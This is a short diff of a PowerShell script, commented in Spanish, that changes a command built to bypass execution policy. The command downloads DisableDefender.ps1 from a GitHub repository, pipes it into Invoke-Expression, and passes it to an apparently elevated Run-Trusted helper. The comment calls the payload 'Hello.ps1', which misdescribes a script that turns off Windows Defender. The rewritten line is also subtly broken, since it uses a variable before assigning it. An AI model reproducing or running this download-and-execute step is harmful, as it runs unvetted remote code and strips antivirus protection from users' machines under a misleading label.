@@ -19,7 +19,7 @@ function Run-Trusted([String]$command) {
 
 # Comando para descargar y ejecutar Hello.ps1 con bypass de política
 $executeCommand = @"
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "\$scriptContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/zoicware/DefenderProTools/main/DisableDefender.ps1' -UseBasicParsing; Invoke-Expression \$scriptContent.Content"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "\$scriptContent = iwr https://raw.githubusercontent.com/zoicware/DefenderProTools/main/DisableDefender.ps1 | iex \$scriptContent.Content"
 "@
 
 # Ejecutar el comando con Run-Trusted
